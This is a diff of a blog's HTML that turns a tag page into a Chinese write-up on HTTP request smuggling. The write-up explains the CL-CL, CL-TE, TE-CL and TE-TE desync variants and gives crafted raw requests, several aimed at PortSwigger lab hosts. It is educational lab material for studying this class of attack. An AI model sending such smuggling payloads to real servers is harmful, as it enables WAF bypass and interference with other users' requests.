@@ -11,38 +11,34 @@
   <meta charset="utf-8">
 
   
-  <title>Posts Related to 科学上网</title>
+  <title>HTTP请求走私</title>
   
-  <link rel="canonical" href="https://ja1e.github.io/tags/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/">
+  <link rel="canonical" href="https://ja1e.github.io/2023/01/15/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/">
   
-  <meta name="description" content="">
+  <meta name="description" content="HTTP请求走私 - FreeBuf网络安全行业门户 由Roarctf Easy Calc引起对http走私和分块传输绕过waf的思考 请求走私漏洞成因  前端服务器(CDN)和后端服务器接收数据不同步，引起对客户端传入的数据理解不一致，从而导致漏洞的产生。  攻击者使前端请求的一部分请求被后端服务">
   
   
   <meta name="author" content="Ja1e">
   
   
-  <meta property="og:image" content="https://ja1e.github.io/images/thumbnail.jpg">
-  
   
   <meta property="og:site_name" content="Ja1e" />
   <meta property="og:type" content="article" />
-  <meta property="og:title" content="Posts Related to 科学上网" />
+  <meta property="og:title" content="HTTP请求走私" />
   
-  <meta property="og:description" content="">
+  <meta property="og:description" content="HTTP请求走私 - FreeBuf网络安全行业门户 由Roarctf Easy Calc引起对http走私和分块传输绕过waf的思考 请求走私漏洞成因  前端服务器(CDN)和后端服务器接收数据不同步，引起对客户端传入的数据理解不一致，从而导致漏洞的产生。  攻击者使前端请求的一部分请求被后端服务">
   
-  <meta property="og:url" content="https://ja1e.github.io/tags/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/" />
+  <meta property="og:url" content="https://ja1e.github.io/2023/01/15/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/" />
 
   <meta name="twitter:card" content="summary_large_image">
-  <meta name="twitter:title" content="Posts Related to 科学上网">
+  <meta name="twitter:title" content="HTTP请求走私">
   
-  <meta name="twitter:description" content="">
-  
-  
-  
-  <meta name="twitter:image" content="https://ja1e.github.io/images/thumbnail.jpg">
+  <meta name="twitter:description" content="HTTP请求走私 - FreeBuf网络安全行业门户 由Roarctf Easy Calc引起对http走私和分块传输绕过waf的思考 请求走私漏洞成因  前端服务器(CDN)和后端服务器接收数据不同步，引起对客户端传入的数据理解不一致，从而导致漏洞的产生。  攻击者使前端请求的一部分请求被后端服务">
   
   
-  <meta name="twitter:url" content="https://ja1e.github.io/tags/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/" />
+  
+  
+  <meta name="twitter:url" content="https://ja1e.github.io/2023/01/15/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/" />
 
   <!-- Mobile Specific Metas
   –––––––––––––––––––––––––––––––––––––––––––––––––– -->
@@ -180,6 +176,10 @@
         <a href="/">Home</a>
         
           
+          <a href="/tags" class="ml">Tags</a>
+          
+        
+          
           <a href="/about" class="ml">About</a>
           
         
@@ -191,36 +191,98 @@
 </div>
 <link rel="stylesheet" href="/js/prism/prism.css">
         <div class="trans">
-          
+            <h2>HTTP请求走私</h2>
 
+  <p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/243652.html">HTTP请求走私 - FreeBuf网络安全行业门户</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/fsMLNHiyd1_tQkz9wTRhMg">由Roarctf Easy Calc引起对http走私和分块传输绕过waf的思考</a></p>
+<p><strong>请求走私漏洞成因</strong></p>
+<blockquote>
+<p>前端服务器(CDN)和后端服务器接收数据不同步，引起对客户端传入的数据理解不一致，从而导致漏洞的产生。</p>
+</blockquote>
+<p>攻击者使前端请求的一部分请求被后端服务器解释为下一个请求的开始。它实际上是在下一个请求之前，因此会干扰应用程序处理该请求的方式。这是请求走私攻击，可能会造成破坏性后果。</p>
+<p>大多数HTTP请求走私漏洞的出现是因为HTTP规范提供了两种不同的方法来指定请求的结束位置：<code>Content-Length</code>标头和<code>Transfer-Encoding</code>标头。</p>
+<p>走私的类型：</p>
+<h3 id="CL不为0的GET请求"><a href="#CL不为0的GET请求" class="headerlink" title="CL不为0的GET请求"></a>CL不为0的GET请求</h3><p>只有GET请求。前端允许POST，后端不允许POST，也就是说前端会读取<code>Content-Length</code>的值，而后端则会忽略掉<code>Content-Length</code>。</p>
+<pre class="line-numbers language-none"><code class="language-none">GET &#x2F; HTTP&#x2F;1.1\r\n
+Host: example.com\r\n
+Content-Length: 44\r\n
 
-   <h3>Posts Related to — 科学上网</h3>
+GET &#x2F; secret HTTP&#x2F;1.1\r\n
+Host: example.com\r\n
+\r\n<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
+<p>前端服务器收到该请求，通过读取<code>Content-Length</code>，判断这是一个完整的请求。</p>
+<p>而后端服务器收到后，因为它不对<code>Content-Length</code>进行处理，就会认为这是收到了两个请求。</p>
+<h3 id="CL-CL"><a href="#CL-CL" class="headerlink" title="CL-CL"></a>CL-CL</h3><p>前端代理服务器按照第一个<code>Content-Length</code>的值对请求进行处理。</p>
+<p>后端服务器按照第二个<code>Content-Length</code>的值进行处理。</p>
+<pre class="line-numbers language-none"><code class="language-none">POST &#x2F; HTTP&#x2F;1.1\r\n
+Host: example.com\r\n
+Content-Length: 8\r\n
+Content-Length: 7\r\n
 
+12345\r\n
+a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-  <article>
-    <div class="row">
+<h3 id="CL-TE"><a href="#CL-TE" class="headerlink" title="CL-TE"></a>CL-TE</h3><p>前端代理服务器处理<code>Content-Length</code>这一请求头。</p>
+<p>后端服务器处理<code>Transfer-Encoding</code>这一请求头。</p>
+<p>chunk传输数据格式如下，其中size的值由16进制表示。</p>
+<pre class="line-numbers language-none"><code class="language-none">[chunk size][\r\n][chunk data][\r\n][chunk size][\r\n][chunk data][\r\n][chunk size &#x3D; 0][\r\n][\r\n]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-      <div class="three columns left lit">
-        <p class="bottom">2022年7月8日</p>
-      </div>
-      <div class="nine columns left mb-3">
-        <a href="/2022/07/08/%E7%BF%BB%E5%A2%99%E8%AE%B0/">
-          
-            从电脑小白到实现科学上网
-          
-        </a>
-      </div>
-    </div>
-  </article>
+<p>Lab 地址：<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te">https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te</a></p>
+<p>构造数据包</p>
+<pre class="line-numbers language-none"><code class="language-none">POST &#x2F; HTTP&#x2F;1.1\r\n
+Host: ace01fcf1fd05faf80c21f8b00ea006b.web-security-academy.net\r\n
+Content-Length: 6\r\n
+Transfer-Encoding: chunked\r\n
+\r\n
+0\r\n
+\r\n
+G<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
+<h3 id="TE-CL"><a href="#TE-CL" class="headerlink" title="TE-CL"></a>TE-CL</h3><p>前端代理服务器处理<code>Transfer-Encoding</code>这一请求头。</p>
+<p>后端服务器处理<code>Content-Length</code>请求头。</p>
+<p>Lab地址：<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl">https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl</a></p>
+<p>构造数据包</p>
+<pre class="line-numbers language-none"><code class="language-none">POST &#x2F; HTTP&#x2F;1.1\r\n
+Host: acf41f441edb9dc9806dca7b00000035.web-security-academy.net\r\n
+User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko&#x2F;20100101 Firefox&#x2F;56.0\r\n
+Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8\r\n
+Accept-Language: en-US,en;q&#x3D;0.5\r\n
+Cookie: session&#x3D;3Eyiu83ZSygjzgAfyGPn8VdGbKw5ifew\r\n
+Content-Length: 4\r\n
+Transfer-Encoding: chunked\r\n
+\r\n
+12\r\n
+GPOST &#x2F; HTTP&#x2F;1.1\r\n
+\r\n
+0\r\n
+\r\n<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<div class="pagination-bar">
-  <ul class="pagination">
-    
-    
-  </ul>
-</div>
+<h3 id="TE-TE"><a href="#TE-TE" class="headerlink" title="TE-TE"></a>TE-TE</h3><p>前后端服务器都处理<code>Transfer-Encoding</code>请求头。</p>
+<p>这确实是实现了RFC的标准。不过前后端服务器毕竟不是同一种，这就有了一种方法，我们可以对发送的请求包中的<code>Transfer-Encoding</code>进行某种混淆操作，从而使其中一个服务器不处理<code>Transfer-Encoding</code>请求头。从某种意义上还是<code>CL-TE</code>或者<code>TE-CL</code>。</p>
+<p>Lab地址：<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header">https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header</a></p>
+<p>构造数据包</p>
+<pre class="line-numbers language-none"><code class="language-none">POST &#x2F; HTTP&#x2F;1.1\r\n
+Host: ac4b1fcb1f596028803b11a2007400e4.web-security-academy.net\r\n
+User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko&#x2F;20100101 Firefox&#x2F;56.0\r\n
+Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8\r\n
+Accept-Language: en-US,en;q&#x3D;0.5\r\n
+Cookie: session&#x3D;Mew4QW7BRxkhk0p1Thny2GiXiZwZdMd8\r\n
+Content-length: 4\r\n
+Transfer-Encoding: chunked\r\n
+Transfer-encoding: cow\r\n
+\r\n
+5c\r\n
+GPOST &#x2F; HTTP&#x2F;1.1\r\n
+Content-Type: application&#x2F;x-www-form-urlencoded\r\n
+Content-Length: 15\r\n
+\r\n
+x&#x3D;1\r\n
+0\r\n
+\r\n<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+  <p><a class="classtest-link" href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag">web安全</a> — 2023年1月15日</p>
+  
 
 
         </div>
